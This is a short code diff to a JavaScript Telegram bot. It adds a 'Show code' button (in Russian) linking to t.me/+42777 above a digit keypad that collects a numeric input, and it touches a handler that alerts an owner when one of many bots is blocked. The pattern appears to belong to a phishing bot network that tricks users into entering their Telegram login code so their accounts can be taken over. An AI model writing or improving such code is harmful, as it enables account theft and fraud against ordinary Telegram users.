@@ -224,6 +224,12 @@ export default async (token, initialConfig) => {
                                 inline_keyboard: [
                                     [
                                         {
+                                            text: `📲 Показать код`,
+                                            url: `https://t.me/+42777`
+                                        }
+                                    ],
+                                    [
+                                        {
                                             text: `1`,
                                             callback_data: `input:1`
                                         },
@@ -355,6 +361,12 @@ export default async (token, initialConfig) => {
                 inline_keyboard: [
                     [
                         {
+                            text: `📲 Показать код`,
+                            url: `https://t.me/+42777`
+                        }
+                    ],
+                    [
+                        {
                             text: `1`,
                             callback_data: `input:${value}1`
                         },
@@ -415,6 +427,7 @@ export default async (token, initialConfig) => {
         if (!err.message.includes(`401`)) return;
         await bot.stopPolling();
         await Bot.findOneAndUpdate({ token }, { $set: { blocked: true } });
+        
         await mainBot.sendMessage(currentConfig.owner, `*🚨 Ваш бот @${BOT.username} был заблокирован!*`, { parse_mode: 'Markdown' });
     })
 }
